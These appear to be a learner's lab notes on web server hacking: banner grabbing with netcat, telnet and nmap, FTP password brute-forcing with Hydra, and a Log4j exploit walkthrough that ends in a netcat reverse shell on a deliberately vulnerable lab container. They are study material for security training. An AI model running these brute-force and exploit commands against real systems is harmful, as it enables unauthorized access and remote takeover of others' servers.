# Hacking Web Servers

web server is a system that stores, processes, and delivers web pages to global clients via HTTPS protocol

### footprint a web server

by performing footprinting we gather as much valuable information about the target/system as possible
this information include the OS, Software Version, server names, Database scheme details

using different tools we get different information about the target

Telnet = helps us to know the OS, running processes, applications running, server name, server type
other tools that we can use are 
- netcraft
- ID serve
- httprecon
---
for lab purposes

tool used 
#### [[Netcat]]
#tool/linux 

it is a networking utility that reads and writes data across network connections using the TCP/IP protocol

→ in a root terminal
```bash
nc -vv <target-domain> 80
```
> -vv = very verbose
> "80" = is the port we want to connect

then type 
```
GET / HTTP/1.0
```
→ press `ENTER` twice
> this means asking the *target-domain* to serve the `/` page 
> or we can do `/login` to serve a info about the login page
> but here we only need the info so we do this

netcat will perform the banner grabbing and provide info such as
- content type
- last modified date
- accept ranges
- ETag
- server information
---
tool used
#### [[Telnet]]
#tool/linux 
it is similar to **netcat**
although a little older an little but simpler in terms of usage


```bash
telnet <target-domain> 80
```
> this will provide the same info as that of the netcat command

then we  do
```h
GET / HTTP/1.0 
```
→ press `ENTER` twice
> there is a space between the `/` and the `http/1.0`
> also there is a space at the end of this line which is necessary 

Telnet will perform the banner grabbing and provide info such as
- content type
- last modified date
- accept ranges
- ETag
- server information
---

tool used
#### [[Nmap]]

various nmap scripts are useful to footprint or enumerate a web-server

```bash
nmap -sV --script=http-enu, <target-domain>
```
*here target domain = www.goodshopping.com*

```bash
nmap --script=hostmap-bfk --script-args hostmap-bfk.prefix=hostmap- <target-domain>
```

to perform an HTTP trace ⇒
```bash
nmap --script=http-trace -d <target-domain>
```
> -d = debug mode (script execution details - requests/response)
> performs HTTP trace using TRACE method by sending a TRACE request that shows if the method is enabled or not

OR 
we can also detect [[Firewall]] using nmap too
```bash
nmap -p80 --script=http-waf-detect <target-domain>
```
---

## Web server Attack

### Crack FTP credentials


to crack any password or username
first we need to have a wordlist for both parameters

→ to perform a FTP password bruteforce, we need to check whether the port is open on the system or not
```bash
nmap -p 21 <target-domain>
```
> -p 21 = we are specifying port 21 because FTP default port = 21

→ now we now that port 21 is open, we need to be sure about the presence of FTP server
→ so the simplest way to do it is to try to connect to the FTP server
```bash
ftp <target-ip>
```
> if we see a login, *voila*
> try random passwords

now that we have enumerated the presence of an FTP server
we crack
tool used
#### [[PC 2/Hydra]]

```bash
hydra -L /path/to/username.txt -P /path/to/password.txt ftp://<target-domain/ip>
```
> this is a basic syntax but we can modify or improve our command as per needed by adding
> > -s = if the server is not on default port we add `-s 2121` new port *here 2121*
> > -V = to see verbose output of hydra attempts
> > -t 4 = limit the threads to improve stability and stealth

→ Hydra cracks the password, and we try to login using those credentials

enter again
```bash
ftp <target-ip/domain>
```
→ enter the credentials cracked by Hydra
→ type `help` for more info on the commands available in the shell

---

### Exploit log4j vulnerability

here we will be gaining a backdoor into the system by exploiting the Log4j vulnerability

first we install a vulnerable log4j server inside a linux-based machine(Victim Ubuntu)
```bash
apt install docker.io
```
```bash
cd log4j-shell-poc/
```
```bash
docker build -t log4j-shell-poc
```
> -t = specifies a pseudo-tty

→ we have built the docker, now we need to run it
```bash
docker run --network host log4j-shell-poc
```

in the attacker machine
```bash
nmap -sC -sV <target-ip>
```
> -sC = enables default scripts performing tasks such as service detection, vulnerability detection etc.
> -sV = enables service detection

→ we see that port 8080 is open runnning `Apache Tomcat/coyote 1.1`

now we look for an exploit if any
```bash
searchsploit -t Apache RCE
```

→ we see that the java platform is vulnerable for Apache Log4j RCE
hence we now exploit this
→ open firefox
→ search for `http://<target-ip>:8080`
→ press `Enter`

-- in a terminal
extract the JDK file
```bash
tar -xf jdk-8u202-linux-x64.tar.gz
```
> -xf = specifies that the files are to be extracted

move the jdk file to /usr/bin
```bash
mv jdk1.8.0_202 /usr/bin
```
→ now
```bash
cd log4j-shell-poc
```
 we need to make some changes to the poc.py file
 ```bash
 pluma poc.py
 ```
 > line 62 - change `jdk1.8.0_20/bin/javac` with `/usr/bin/jdk1.8.0_202/bin/javac`
 > line 87 - `jdk1.8.0_20/bin/javac` to `/usr/bin/jdk1.8.0_202/bin/javac`
 > line 99 - `jdk1.8.0_20/bin/javac` to `/usr/bin/jdk1.8.0_202/bin/javac`
 > → save the changes and exit

 now before initiating the command
 initiate a [[netcat]] listener in a different terminal
 ```bash
 nc -nlvp 9001
 ```

now in the Attacker another terminal
 ```bash
 python3 poc.py -userip 10.10.1.13 --webport 8000 --lport 9001
 ```
 > a payload will be generated in the `send me:` section
 > copy the payload
 
 → open the firefox with the page loaded previously
 → paste the payload copied
 → enter `password`in the password section

→ in the netcat listener we have a reverse shell
→ do  `whoami`and `pwd`

---
